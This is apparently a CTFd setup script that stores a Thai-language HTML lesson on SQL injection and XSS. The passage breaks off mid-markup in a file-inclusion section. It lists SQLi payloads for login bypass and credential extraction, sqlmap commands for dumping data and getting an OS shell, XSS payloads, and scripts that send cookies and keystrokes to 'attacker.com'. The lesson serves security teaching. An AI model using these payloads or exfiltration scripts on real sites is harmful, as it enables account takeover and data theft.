import json
import sys
sys.path.insert(0, '/opt/CTFd')
from CTFd import create_app
from CTFd.plugins.tutorials import TutorialLesson

app = create_app()

NEW_BLOCK_0 = """<div style="text-align: center; margin-bottom: 2rem; padding: 24px; background: linear-gradient(135deg, rgba(255,0,127,0.15) 0%, rgba(239,68,68,0.15) 100%); border: 1px solid rgba(255,0,127,0.3); border-radius: 16px; box-shadow: 0 0 20px rgba(255,0,127,0.15);">
<h2 style="margin: 0; font-size: 1.9rem; font-weight: 800; color: #ffffff; text-shadow: 0 0 12px rgba(255,0,127,0.6); letter-spacing: 0.03em;">💉 SQL Injection, XSS, File Inclusion & Brute Force</h2>
<p style="margin: 8px 0 0 0; font-size: 0.92rem; color: #94a3b8; font-weight: 500;">เจาะลึกการโจมตีฐานข้อมูล, สคริปต์อันตราย, การรวมไฟล์ระยะไกล และการทดลองรหัสผ่านอัตโนมัติ</p>
</div>

<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 16px; margin: 1.5rem auto;">
<div style="background: linear-gradient(to bottom right, rgba(255,0,127,0.06), rgba(255,0,127,0.02)); border: 1px solid rgba(255,0,127,0.2); border-radius: 12px; padding: 18px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
<strong style="color: #ff007f; font-size: 0.98rem; display: flex; align-items: center; gap: 8px; margin-bottom: 10px; text-shadow: 0 0 8px rgba(255,0,127,0.3);">💉 SQL Injection</strong>
<span style="color: #cbd5e1; font-size: 0.82rem; line-height: 1.6;">ฝัง SQL commands ที่เป็นอันตรายเข้าในฟอร์มเพื่อดึงข้อมูล, ข้ามการยืนยันตัวตน หรือทำลายฐานข้อมูล</span>
</div>
<div style="background: linear-gradient(to bottom right, rgba(251,191,36,0.06), rgba(251,191,36,0.02)); border: 1px solid rgba(251,191,36,0.2); border-radius: 12px; padding: 18px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
<strong style="color: #fbbf24; font-size: 0.98rem; display: flex; align-items: center; gap: 8px; margin-bottom: 10px; text-shadow: 0 0 8px rgba(251,191,36,0.3);">📜 Cross-Site Scripting (XSS)</strong>
<span style="color: #cbd5e1; font-size: 0.82rem; line-height: 1.6;">ฝัง JavaScript อันตรายเข้าในเว็บ เพื่อขโมย session, cookie หรือทำ phishing กับผู้เยี่ยมชม</span>
</div>
<div style="background: linear-gradient(to bottom right, rgba(0,240,255,0.06), rgba(0,240,255,0.02)); border: 1px solid rgba(0,240,255,0.2); border-radius: 12px; padding: 18px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
<strong style="color: #00f0ff; font-size: 0.98rem; display: flex; align-items: center; gap: 8px; margin-bottom: 10px; text-shadow: 0 0 8px rgba(0,240,255,0.3);">📁 File Inclusion (LFI/RFI)</strong>
<span style="color: #cbd5e1; font-size: 0.82rem; line-height: 1.6;">รวมไฟล์จากเครื่อง server (LFI) หรือจาก server ของผู้โจมตี (RFI) เพื่อรันโค้ดอันตราย</span>
</div>
<div style="background: linear-gradient(to bottom right, rgba(168,85,247,0.06), rgba(168,85,247,0.02)); border: 1px solid rgba(168,85,247,0.2); border-radius: 12px; padding: 18px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
<strong style="color: #a855f7; font-size: 0.98rem; display: flex; align-items: center; gap: 8px; margin-bottom: 10px; text-shadow: 0 0 8px rgba(168,85,247,0.3);">🔑 Brute Force Attack</strong>
<span style="color: #cbd5e1; font-size: 0.82rem; line-height: 1.6;">ทดลองรหัสผ่านทุก combination อย่างเป็นระบบด้วยเครื่องมือ เช่น Hydra, WFUZZ หรือ Python script</span>
</div>
</div>

---

<div style="margin: 2rem 0;">
<div style="font-size: 1.1rem; font-weight: 800; color: #ff007f; margin-bottom: 6px; text-shadow: 0 0 8px rgba(255,0,127,0.4);">💉 SQL Injections (SQLi)</div>
<div style="height: 2px; background: linear-gradient(90deg, #ff007f, transparent); margin-bottom: 18px; border-radius: 1px;"></div>

<div style="background: #05070f; border: 1px solid rgba(255,0,127,0.15); border-radius: 12px; padding: 20px; margin-bottom: 20px; box-shadow: 0 8px 24px rgba(0,0,0,0.4);">
<p style="color: #cbd5e1; font-size: 0.88rem; line-height: 1.75; margin: 0 0 12px 0;"><strong style="color: #ffffff;">SQL Injection (SQLi)</strong> คือหนึ่งในช่องโหว่เว็บที่<strong style="color: #ff007f;">อันตรายที่สุด</strong> โดยผู้โจมตีสามารถฝังคำสั่ง SQL เข้าไปในช่องรับข้อมูลที่แอปพลิเคชันนำไปใช้ในคำสั่งฐานข้อมูลโดยตรง เมื่อแอปพลิเคชัน<strong style="color: #fbbf24;"> ไม่กรองอินพุตของผู้ใช้งาน</strong> อย่างเหมาะสม ผู้โจมตีสามารถฝัง SQL statements ที่เป็นอันตรายได้</p>
<div style="display: flex; gap: 8px; flex-wrap: wrap;">
<a href="https://www.indusface.com/blog/how-to-stop-sql-injection/" target="_blank" style="font-size: 0.75rem; color: #ff007f; background: rgba(255,0,127,0.08); border: 1px solid rgba(255,0,127,0.25); padding: 4px 10px; border-radius: 20px; text-decoration: none;"><i class="fas fa-link mr-1"></i> How to Stop SQL Injection</a>
</div>
</div>

<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px;">
<div style="background: rgba(255,0,127,0.06); border: 1px solid rgba(255,0,127,0.2); border-radius: 10px; padding: 16px;">
<div style="color: #ff007f; font-weight: 700; font-size: 0.85rem; margin-bottom: 8px;"><i class="fas fa-user-lock mr-2"></i>Authentication Bypass</div>
<div style="color: #94a3b8; font-size: 0.8rem; line-height: 1.6;">ใช้ SQL comment <code style="color:#fbbf24; background:rgba(255,255,255,0.05); padding:1px 4px; border-radius:3px;">--</code> ตัดส่วน password check ออก ทำให้ล็อกอินได้โดยไม่ต้องรู้รหัสผ่าน</div>
</div>
<div style="background: rgba(251,191,36,0.06); border: 1px solid rgba(251,191,36,0.2); border-radius: 10px; padding: 16px;">
<div style="color: #fbbf24; font-weight: 700; font-size: 0.85rem; margin-bottom: 8px;"><i class="fas fa-database mr-2"></i>Data Stealing (OR '1'='1')</div>
<div style="color: #94a3b8; font-size: 0.8rem; line-height: 1.6;">ใช้ตรรกะ <code style="color:#fbbf24; background:rgba(255,255,255,0.05); padding:1px 4px; border-radius:3px;">OR '1'='1'</code> ทำให้เงื่อนไขเป็นจริงเสมอ ดึงข้อมูลทุก record ออกมา</div>
</div>
<div style="background: rgba(0,240,255,0.06); border: 1px solid rgba(0,240,255,0.2); border-radius: 10px; padding: 16px;">
<div style="color: #00f0ff; font-weight: 700; font-size: 0.85rem; margin-bottom: 8px;"><i class="fas fa-link mr-2"></i>UNION-Based SQLi</div>
<div style="color: #94a3b8; font-size: 0.8rem; line-height: 1.6;">ต่อผลลัพธ์ของ query ที่สองเข้ากับ query เดิม ดึง username/password จาก table อื่น</div>
</div>
<div style="background: rgba(168,85,247,0.06); border: 1px solid rgba(168,85,247,0.2); border-radius: 10px; padding: 16px;">
<div style="color: #a855f7; font-weight: 700; font-size: 0.85rem; margin-bottom: 8px;"><i class="fas fa-eye-slash mr-2"></i>Blind SQLi (Boolean)</div>
<div style="color: #94a3b8; font-size: 0.8rem; line-height: 1.6;">ใช้ <code style="color:#fbbf24; background:rgba(255,255,255,0.05); padding:1px 4px; border-radius:3px;">SUBSTRING()</code> ถาม-ตอบทีละตัวอักษร ค้นหาชื่อ database โดยไม่มี error</div>
</div>
</div>
</div>

<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,0,127,0.2); border-radius: 12px; background: #05070f; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
<div style="padding: 14px 18px; background: rgba(255,0,127,0.08); border-bottom: 1px solid rgba(255,0,127,0.15);">
<span style="font-size: 0.82rem; font-weight: 700; color: #ff007f; text-transform: uppercase; letter-spacing: 0.06em;"><i class="fas fa-table mr-2"></i>SQL Injection Payload Reference</span>
<a href="https://github.com/payloadbox/sql-injection-payload-list" target="_blank" style="float:right; font-size:0.72rem; color:#64748b; text-decoration:none;">payloadbox/sql-injection-payload-list ↗</a>
</div>
<table style="width: 100%; border-collapse: collapse; font-size: 0.8rem;">
<thead>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.06);">
<th style="padding: 10px 14px; color: #ff007f; font-weight: 700; text-align: left; white-space: nowrap; width: 18%;">Category</th>
<th style="padding: 10px 14px; color: #ff007f; font-weight: 700; text-align: left; width: 42%;">Payload</th>
<th style="padding: 10px 14px; color: #ff007f; font-weight: 700; text-align: left;">Description</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);">
<td rowspan="4" style="padding:10px 14px; color:#fbbf24; font-weight:600; vertical-align:top; white-space:nowrap; border-right:1px solid rgba(255,255,255,0.04);">Auth Bypass</td>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' OR '1'='1' --</td>
<td style="padding:8px 14px; color:#94a3b8;">Bypasses login by always returning true</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">admin' --</td>
<td style="padding:8px 14px; color:#94a3b8;">Logs in as "admin" by commenting out password check</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' OR 1=1 --</td>
<td style="padding:8px 14px; color:#94a3b8;">Classic authentication bypass</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' OR 'x'='x' --</td>
<td style="padding:8px 14px; color:#94a3b8;">Another variation of authentication bypass</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);">
<td rowspan="4" style="padding:10px 14px; color:#00f0ff; font-weight:600; vertical-align:top; white-space:nowrap; border-right:1px solid rgba(255,255,255,0.04);">UNION-Based</td>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' UNION SELECT null,username,password FROM users --</td>
<td style="padding:8px 14px; color:#94a3b8;">Extracts usernames and passwords</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' UNION SELECT database(),user(),version() --</td>
<td style="padding:8px 14px; color:#94a3b8;">Retrieves database details</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --</td>
<td style="padding:8px 14px; color:#94a3b8;">Lists all tables in the database</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --</td>
<td style="padding:8px 14px; color:#94a3b8;">Lists all column names in the "users" table</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);">
<td rowspan="3" style="padding:10px 14px; color:#ef4444; font-weight:600; vertical-align:top; white-space:nowrap; border-right:1px solid rgba(255,255,255,0.04);">Error-Based</td>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' AND (SELECT @@version) --</td>
<td style="padding:8px 14px; color:#94a3b8;">Returns the database version</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' AND 1=convert(int,(SELECT @@version)) --</td>
<td style="padding:8px 14px; color:#94a3b8;">Forces an error that leaks the database version</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' AND (SELECT database()) --</td>
<td style="padding:8px 14px; color:#94a3b8;">Retrieves the current database name</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td rowspan="2" style="padding:10px 14px; color:#a855f7; font-weight:600; vertical-align:top; white-space:nowrap; border-right:1px solid rgba(255,255,255,0.04);">Blind-Boolean</td>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' AND (SELECT SUBSTRING(database(),1,1)) = 'm' --</td>
<td style="padding:8px 14px; color:#94a3b8;">Checks if the first letter of the database is 'm'</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' AND (SELECT COUNT(*) FROM users) > 5 --</td>
<td style="padding:8px 14px; color:#94a3b8;">Checks if the number of users is greater than 5</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td rowspan="2" style="padding:10px 14px; color:#3ddc84; font-weight:600; vertical-align:top; white-space:nowrap; border-right:1px solid rgba(255,255,255,0.04);">Time-Based</td>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' OR IF(1=1, SLEEP(5), 0) --</td>
<td style="padding:8px 14px; color:#94a3b8;">Delays execution for 5 seconds if condition is true</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">' OR IF(ASCII(SUBSTRING((SELECT database()),1,1))>109, SLEEP(5), 0) --</td>
<td style="padding:8px 14px; color:#94a3b8;">Extracts the first letter of the database using time delay</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:10px 14px; color:#f97316; font-weight:600; vertical-align:top; white-space:nowrap; border-right:1px solid rgba(255,255,255,0.04);">WAF Bypass</td>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">admin'/**/OR/**/1=1/**/ -- | AdMiN' Or '1'='1' -- | %27%20OR%201=1--</td>
<td style="padding:8px 14px; color:#94a3b8;">Comments, mixed-case, and URL-encoded payloads to bypass WAF filters</td>
</tr>
</tbody>
</table>
</div>

<div style="margin: 2rem 0;">
<div style="font-size: 1rem; font-weight: 800; color: #00f0ff; margin-bottom: 6px; text-shadow: 0 0 8px rgba(0,240,255,0.4);">🛠️ SQLMap — เครื่องมือตรวจจับและโจมตี SQLi อัตโนมัติ</div>
<div style="height: 2px; background: linear-gradient(90deg, #00f0ff, transparent); margin-bottom: 18px; border-radius: 1px;"></div>

<div style="background: #05070f; border: 1px solid rgba(0,240,255,0.15); border-radius: 12px; padding: 20px; margin-bottom: 16px;">
<p style="color: #cbd5e1; font-size: 0.88rem; line-height: 1.75; margin: 0 0 10px 0;"><strong style="color: #ffffff;">SQLMap</strong> คือเครื่องมืออัตโนมัติที่ตรวจจับและโจมตีช่องโหว่ SQL Injection สามารถ dump ฐานข้อมูล, ดึง user & password และควบคุม server ได้ <a href="https://tryhackme.com/room/sqlmap" target="_blank" style="color:#00f0ff; text-decoration:none;">→ TryHackMe SQLMap Room</a></p>

<div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 14px;">
<div style="background: rgba(0,240,255,0.05); border: 1px solid rgba(0,240,255,0.15); border-radius: 8px; padding: 12px;">
<div style="color:#00f0ff; font-size:0.78rem; font-weight:700; margin-bottom:6px;"><i class="fas fa-bullseye mr-1"></i> Basic Usage</div>
<div style="font-family:monospace; font-size:0.72rem; color:#cbd5e1; line-height:1.7;"><span style="color:#ff007f;">-u</span> &lt;URL&gt;<br><span style="color:#ff007f;">--data</span> &lt;POST&gt;<br><span style="color:#ff007f;">--cookie</span> &lt;COOKIE&gt;<br><span style="color:#ff007f;">--random-agent</span><br><span style="color:#ff007f;">--proxy</span> &lt;PROXY&gt;</div>
</div>
<div style="background: rgba(0,240,255,0.05); border: 1px solid rgba(0,240,255,0.15); border-radius: 8px; padding: 12px;">
<div style="color:#00f0ff; font-size:0.78rem; font-weight:700; margin-bottom:6px;"><i class="fas fa-database mr-1"></i> DB Enumeration</div>
<div style="font-family:monospace; font-size:0.72rem; color:#cbd5e1; line-height:1.7;"><span style="color:#ff007f;">--dbs</span><br><span style="color:#ff007f;">-D</span> &lt;db&gt; <span style="color:#ff007f;">--tables</span><br><span style="color:#ff007f;">-T</span> &lt;table&gt; <span style="color:#ff007f;">--columns</span><br><span style="color:#ff007f;">--schema</span><br><span style="color:#ff007f;">--count</span></div>
</div>
<div style="background: rgba(0,240,255,0.05); border: 1px solid rgba(0,240,255,0.15); border-radius: 8px; padding: 12px;">
<div style="color:#00f0ff; font-size:0.78rem; font-weight:700; margin-bottom:6px;"><i class="fas fa-download mr-1"></i> Data Extraction</div>
<div style="font-family:monospace; font-size:0.72rem; color:#cbd5e1; line-height:1.7;"><span style="color:#ff007f;">--dump</span><br><span style="color:#ff007f;">--dump-all</span><br><span style="color:#ff007f;">--passwords</span><br><span style="color:#ff007f;">--sql-query</span> &lt;SQL&gt;<br><span style="color:#ff007f;">--sql-shell</span></div>
</div>
<div style="background: rgba(168,85,247,0.05); border: 1px solid rgba(168,85,247,0.15); border-radius: 8px; padding: 12px;">
<div style="color:#a855f7; font-size:0.78rem; font-weight:700; margin-bottom:6px;"><i class="fas fa-user-shield mr-1"></i> User Privileges</div>
<div style="font-family:monospace; font-size:0.72rem; color:#cbd5e1; line-height:1.7;"><span style="color:#ff007f;">--users</span><br><span style="color:#ff007f;">--privileges</span><br><span style="color:#ff007f;">--roles</span><br><span style="color:#ff007f;">--current-user</span><br><span style="color:#ff007f;">--is-dba</span></div>
</div>
<div style="background: rgba(251,191,36,0.05); border: 1px solid rgba(251,191,36,0.15); border-radius: 8px; padding: 12px;">
<div style="color:#fbbf24; font-size:0.78rem; font-weight:700; margin-bottom:6px;"><i class="fas fa-shield-alt mr-1"></i> Bypass Security</div>
<div style="font-family:monospace; font-size:0.72rem; color:#cbd5e1; line-height:1.7;"><span style="color:#ff007f;">--tamper=</span>&lt;script&gt;<br><span style="color:#ff007f;">--hex</span><br><span style="color:#ff007f;">--delay</span> &lt;SEC&gt;<br><span style="color:#ff007f;">--no-cast</span><br><span style="color:#ff007f;">--safe-url</span> &lt;URL&gt;</div>
</div>
<div style="background: rgba(61,220,132,0.05); border: 1px solid rgba(61,220,132,0.15); border-radius: 8px; padding: 12px;">
<div style="color:#3ddc84; font-size:0.78rem; font-weight:700; margin-bottom:6px;"><i class="fas fa-bug mr-1"></i> Blind Techniques</div>
<div style="font-family:monospace; font-size:0.72rem; color:#cbd5e1; line-height:1.7;"><span style="color:#ff007f;">--technique=</span>B,T,U,E<br><span style="color:#ff007f;">--time-sec=</span>&lt;SEC&gt;<br><span style="color:#ff007f;">--level=</span>&lt;1-5&gt;<br><span style="color:#ff007f;">--risk=</span>&lt;1-3&gt;</div>
</div>
</div>
</div>
</div>

<div style="background: #05070f; border: 1px solid rgba(0,240,255,0.1); border-left: 3px solid #00f0ff; border-radius: 8px; padding: 16px; margin-bottom: 1.5rem;">
<div style="font-size: 0.8rem; font-weight: 700; color: #00f0ff; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.05em;"><i class="fas fa-terminal mr-2"></i>SQLMap — ตัวอย่างคำสั่งใช้งานจริง</div>
<pre style="margin:0; background:transparent; padding:0; font-size:0.8rem; color:#94a3b8; white-space:pre-wrap;"><span style="color:#64748b;"># 1. ตรวจสอบช่องโหว่</span>
<span style="color:#00f0ff;">sqlmap</span> -u <span style="color:#fbbf24;">"http://target.com/index.php?id=1"</span> --dbs

<span style="color:#64748b;"># 2. ดึงรายชื่อตาราง</span>
<span style="color:#00f0ff;">sqlmap</span> -u <span style="color:#fbbf24;">"http://target.com/index.php?id=1"</span> -D target_db --tables

<span style="color:#64748b;"># 3. dump ข้อมูลจาก users table</span>
<span style="color:#00f0ff;">sqlmap</span> -u <span style="color:#fbbf24;">"http://target.com/index.php?id=1"</span> -D target_db -T users --dump

<span style="color:#64748b;"># 4. Bypass WAF ด้วย tamper script</span>
<span style="color:#00f0ff;">sqlmap</span> -u <span style="color:#fbbf24;">"http://target.com/index.php?id=1"</span> --tamper=randomcase

<span style="color:#64748b;"># 5. Gain Shell Access</span>
<span style="color:#00f0ff;">sqlmap</span> -u <span style="color:#fbbf24;">"http://target.com/index.php?id=1"</span> --os-shell</pre>
</div>

---

<div style="margin: 2rem 0;">
<div style="font-size: 1.1rem; font-weight: 800; color: #fbbf24; margin-bottom: 6px; text-shadow: 0 0 8px rgba(251,191,36,0.4);">📜 Cross-Site Scripting (XSS)</div>
<div style="height: 2px; background: linear-gradient(90deg, #fbbf24, transparent); margin-bottom: 18px; border-radius: 1px;"></div>

<div style="background: #05070f; border: 1px solid rgba(251,191,36,0.15); border-radius: 12px; padding: 20px; margin-bottom: 20px;">
<p style="color: #cbd5e1; font-size: 0.88rem; line-height: 1.75; margin: 0;"><strong style="color: #ffffff;">Cross-Site Scripting (XSS)</strong> คือการโจมตีฝั่ง client ที่ผู้โจมตี<strong style="color: #fbbf24;"> ฝัง JavaScript อันตราย</strong>ลงในหน้าเว็บที่ผู้ใช้งานเปิดอ่าน สามารถใช้ขโมย session token, cookie, password หรือกระทำการแทนเหยื่อได้</p>
</div>

<div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 20px;">
<div style="background: rgba(255,0,127,0.06); border: 1px solid rgba(255,0,127,0.2); border-radius: 10px; padding: 16px;">
<div style="color: #ff007f; font-weight: 700; font-size: 0.85rem; margin-bottom: 8px;"><i class="fas fa-database mr-2"></i>Stored XSS (Persistent)</div>
<div style="color: #94a3b8; font-size: 0.8rem; line-height: 1.6; margin-bottom: 8px;">Payload ถูกบันทึกลงฐานข้อมูล ทุกคนที่เปิดหน้านั้นจะโดน XSS</div>
<div style="font-family: monospace; font-size: 0.72rem; color: #fbbf24; background: rgba(0,0,0,0.3); padding: 6px 10px; border-radius: 5px;">&lt;script&gt;alert('XSS');&lt;/script&gt;</div>
</div>
<div style="background: rgba(251,191,36,0.06); border: 1px solid rgba(251,191,36,0.2); border-radius: 10px; padding: 16px;">
<div style="color: #fbbf24; font-weight: 700; font-size: 0.85rem; margin-bottom: 8px;"><i class="fas fa-link mr-2"></i>Reflected XSS (Non-Persistent)</div>
<div style="color: #94a3b8; font-size: 0.8rem; line-height: 1.6; margin-bottom: 8px;">Payload อยู่ใน URL รันทันทีที่เหยื่อคลิกลิงก์อันตราย</div>
<div style="font-family: monospace; font-size: 0.72rem; color: #fbbf24; background: rgba(0,0,0,0.3); padding: 6px 10px; border-radius: 5px;">?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
</div>
<div style="background: rgba(0,240,255,0.06); border: 1px solid rgba(0,240,255,0.2); border-radius: 10px; padding: 16px;">
<div style="color: #00f0ff; font-weight: 700; font-size: 0.85rem; margin-bottom: 8px;"><i class="fas fa-code mr-2"></i>DOM-Based XSS</div>
<div style="color: #94a3b8; font-size: 0.8rem; line-height: 1.6; margin-bottom: 8px;">Payload แก้ไข DOM โดยตรง ไม่ส่งไปเซิร์ฟเวอร์ ซ่อนตัวได้ดีกว่า</div>
<div style="font-family: monospace; font-size: 0.72rem; color: #fbbf24; background: rgba(0,0,0,0.3); padding: 6px 10px; border-radius: 5px;">#&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
</div>
</div>

<div style="overflow-x: auto; margin: 0 0 20px 0; border: 1px solid rgba(251,191,36,0.2); border-radius: 12px; background: #05070f;">
<div style="padding: 12px 16px; background: rgba(251,191,36,0.06); border-bottom: 1px solid rgba(251,191,36,0.12);">
<span style="font-size: 0.8rem; font-weight: 700; color: #fbbf24; text-transform: uppercase; letter-spacing: 0.06em;"><i class="fas fa-bomb mr-2"></i>Common XSS Payloads</span>
</div>
<table style="width: 100%; border-collapse: collapse; font-size: 0.8rem;">
<thead>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.06);">
<th style="padding: 10px 14px; color: #fbbf24; font-weight: 700; text-align: left; width: 55%;">Payload</th>
<th style="padding: 10px 14px; color: #fbbf24; font-weight: 700; text-align: left;">Description</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">&lt;script&gt;alert('XSS')&lt;/script&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Simple alert box</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Closing attributes to break out</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">&lt;img src=x onerror=alert('XSS')&gt;</td><td style="padding:8px 14px; color:#94a3b8;">XSS via image error</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">&lt;svg/onload=alert('XSS')&gt;</td><td style="padding:8px 14px; color:#94a3b8;">XSS using SVG</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</td><td style="padding:8px 14px; color:#94a3b8;">XSS in iframe</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">&lt;body onload=alert('XSS')&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Triggers on page load</td></tr>
<tr><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">&lt;a href="javascript:alert('XSS')"&gt;Click me&lt;/a&gt;</td><td style="padding:8px 14px; color:#94a3b8;">XSS via href</td></tr>
</tbody>
</table>
</div>

<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 16px;">
<div style="background: #05070f; border: 1px solid rgba(255,0,127,0.15); border-left: 3px solid #ff007f; border-radius: 8px; padding: 16px;">
<div style="font-size: 0.8rem; font-weight: 700; color: #ff007f; margin-bottom: 10px;"><i class="fas fa-cookie-bite mr-2"></i>Steal Cookies</div>
<pre style="margin:0; font-size:0.75rem; color:#94a3b8; white-space:pre-wrap; background:transparent; padding:0;">&lt;script&gt;document.location=
  'http://attacker.com/steal.php?cookie='
  +document.cookie;
&lt;/script&gt;</pre>
</div>
<div style="background: #05070f; border: 1px solid rgba(251,191,36,0.15); border-left: 3px solid #fbbf24; border-radius: 8px; padding: 16px;">
<div style="font-size: 0.8rem; font-weight: 700; color: #fbbf24; margin-bottom: 10px;"><i class="fas fa-keyboard mr-2"></i>Keylogging Attack</div>
<pre style="margin:0; font-size:0.75rem; color:#94a3b8; white-space:pre-wrap; background:transparent; padding:0;">&lt;script&gt;
document.onkeypress = function(e) {
  fetch('http://attacker.com/log.php?key='
    + e.key);
};
&lt;/script&gt;</pre>
</div>
</div>

<div style="background: #05070f; border: 1px solid rgba(0,240,255,0.1); border-left: 3px solid #00f0ff; border-radius: 8px; padding: 16px; margin-bottom: 1.5rem;">
<div style="font-size: 0.8rem; font-weight: 700; color: #00f0ff; margin-bottom: 10px;"><i class="fas fa-terminal mr-2"></i>XSStrike — Advanced XSS Scanner</div>
<pre style="margin:0; background:transparent; padding:0; font-size:0.8rem; color:#94a3b8; white-space:pre-wrap;"><span style="color:#64748b;"># ติดตั้ง XSStrike</span>
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike && pip3 install -r requirements.txt

<span style="color:#64748b;"># Scan URL for XSS</span>
python3 xsstrike.py -u <span style="color:#fbbf24;">"http://target.com/search.php?q=test"</span>

<span style="color:#64748b;"># Enable WAF Bypass Mode</span>
python3 xsstrike.py -u <span style="color:#fbbf24;">"http://target.com/search.php?q="</span> --fuzz</pre>
</div>
</div>

---

<div style="margin: 2rem 0;">
<div style="font-size: 1.1rem; font-weight: 800; color: #00f0ff; margin-bottom: 6px; text-shadow: 0 0 8px rgba(0,240,255,0.4);">📁 File Inclusion Attacks (LFI / RFI)</div>
<div style="height: 2px; background: linear-gradient(90deg, #00f0ff, transparent); margin-bottom: 18px; border-radius: 1px;"></div>

<div style="background: #05070f; border: 1px solid rgba(0,240,255,0.15); border-radius: 12px; padding: 20px; margin-bottom: 20px;">
<p style="color: #cbd5e1; font-size: 0.88rem; line-height: 1.75; margin: 0 0 12px 0;"><strong style="color: #ffffff;">File Inclusion Attack</strong> เกิดขึ้นเมื่อผู้โจมตีสามารถรวมไฟล์เข้าในเว็บแอปพลิเคชันเนื่องจากการตรวจสอบ input ไม่เพียงพอ ใช้เพื่อ<strong style="color: #00f0ff;"> รันโค้ดอันตราย</strong>หรือเปิดเผยข้อมูลสำคัญ</p>
<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
<div style="background: rgba(0,240,255,0.05); border: 1px solid rgba(0,240,255,0.15); border-radius: 8px; padding: 12px;">
<div style="color: #00f0ff; font-weight: 700; font-size: 0.82rem; margin-bottom: 6px;"><i class="fas fa-server mr-2"></i>Local File Inclusion (LFI)</div>
